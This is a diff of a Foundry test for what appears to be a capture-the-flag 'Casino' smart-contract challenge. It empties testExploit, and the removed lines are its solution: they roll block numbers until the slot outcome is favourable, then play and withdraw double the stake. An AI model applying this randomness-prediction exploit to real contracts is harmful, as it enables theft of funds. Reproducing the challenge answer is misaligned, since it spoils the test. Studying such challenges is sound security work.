@@ -24,22 +24,5 @@ contract CasinoTest is Test {
         casino = base.casino();
     }
 
-    function testExploit() public {
-        uint256 blockNum = block.number;
-        vm.startPrank(you);
-
-        // simulate playing the slot in upcoming blocks
-        do {
-            vm.roll(blockNum++);
-        } while (casino.slot() == 0);
-
-        // play with wNative
-        casino.play(wNative, 500e18);
-        casino.withdraw(wNative, 1_000e18);
-
-        // solve
-        base.solve();
-        assertTrue(base.isSolved());
-        vm.stopPrank();
-    }
+    function testExploit() public {}
 }
